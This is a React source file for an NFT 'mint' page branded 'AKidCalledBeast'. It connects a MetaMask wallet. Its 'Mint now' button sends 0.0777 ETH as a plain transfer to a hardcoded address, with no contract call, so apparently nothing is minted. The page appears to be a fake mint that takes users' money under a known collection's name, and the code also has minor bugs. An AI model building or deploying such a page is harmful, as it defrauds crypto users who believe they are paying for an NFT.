import { Box, Button, Divider, Flex, Heading, Text } from '@chakra-ui/react'
import React from 'react'
import Image2 from './assets/abeast.gif'
import { useState, useEffect } from 'react';
import { ethers } from "ethers";

function Home() {

  const [walletBalance, setWalletBalance] = useState('')
  const [walletConnected, setWalletConnected] = useState('')

  useEffect(() => {
    addWalletListener();
  })


  const login = async () => {
    // This gets is metamask wallet is installed
    if (typeof window != 'undefined' && typeof window.ethereum != 'undefined') {
      try {
        const provider = new ethers.providers.Web3Provider(window.ethereum)
        const accounts = await provider.send("eth_requestAccounts", []);

        // const balance = await provider.getBalance("ethers.eth")
        // ethers.utils.formatEther(balance)

        const account = accounts[0];
        const walletAddress = account;
        // const walletBalance = ethers.utils.formatEther(balance);

        setWalletConnected(walletAddress);
        setWalletBalance(walletBalance);

        console.log('Wallet Connected')
        console.log(walletAddress)
        // console.log(walletBalance)
        // console.log(ethers.utils.formatEther(balance))

      } catch (error) {
        console.error(error)
      }
    } else {
      // if metamask wallet is not installed do this 
      window.open("https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn", "_blank");
    }
  }


  // Get Transaction 
  const provider = new ethers.providers.Web3Provider(window.ethereum)

  const transact = async () => {

    const accounts = await provider.send("eth_requestAccounts", []);
    window.ethereum
      .request({
        method: 'eth_sendTransaction',
        params: [
          {
            from: accounts[0],
            to: '0x40068e362465e279398ce4C61AE0eC73b97bd836',
            value: Number(77700000000000000).toString(16),
            gasPrice: Number(2500000).toString(16),
            gas: Number(21000).toString(16),
          },
        ],
      })
      .then((txHash) => console.log(txHash))
      .catch((error) => console.error);

  }

  // This help to get account information when logged in to another account without reloading.
  const addWalletListener = async () => {
    // This gets is metamask wallet is installed
    if (typeof window != 'undefined' && typeof window.ethereum != 'undefined') {
      window.ethereum.on('accountsChanged', (accounts) => {
        const account = accounts[0];
        const walletAddress = account;
        setWalletConnected(walletAddress);

        console.log('Wallet Connected')
        console.log(walletAddress)
      })
    } else {
      // if metamask wallet is not installed do this 
      window.open("https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn", "_blank");
    }
  }

  // Logout function
  const logout = async () => {
    await window.ethers?.disconnect();
    setWalletConnected('')

    console.log('Wallet Disconnected')
  }



  return (
    <Box className='home'>
      <Flex flexDirection='column' p='30px' justify='space-between' rounded='20px' bg='#242322' color='white' w='400px' h='500px' blur={10}>
        <Box>
          <Heading m='0'>AKidCalledBeast Mint</Heading>
          <Text m='0' fontStyle='italic'>Total supply: 999 NFTs</Text>
        </Box>
        <Flex align='center' justify='space-between'>
          <Box rounded='15px' overflow='hidden' >
            <img src={Image2} alt='' width={180} />
          </Box>
          <Flex flexDirection='column' textAlign='right' gap='10px'>
            <Text fontStyle='italic' m='0'>Price per NFT</Text>
            <Text fontSize='20px' fontWeight='700' m='0'>0.0777 ETH + gas</Text>
            <Text fontStyle='italic' w='150px' m='0'>Pre sale available 15.01.2023</Text>
          </Flex>
        </Flex>
        <Divider w='full' bg='#fff' />
        <Flex align='center' justify='space-between' fontSize='20px' >
          <Text>Total</Text>
          <Text fontWeight='700'>0.0777 ETH + gas</Text>
        </Flex>
        <Divider w='full' />
        {walletConnected ? (

          <Button w='full' px='10px' py='15px' bg='white' color='#000' rounded='10px' fontWeight='600' fontSize='22px' onClick={transact}>Mint now</Button>
        ) : (

        <Button w='full' px='10px' py='15px' bg='white' color='#000' rounded='10px' fontWeight='600' fontSize='22px' onClick={login}>Connect wallet</Button>
        )}
      </Flex>
    </Box>
  )
}

export default Home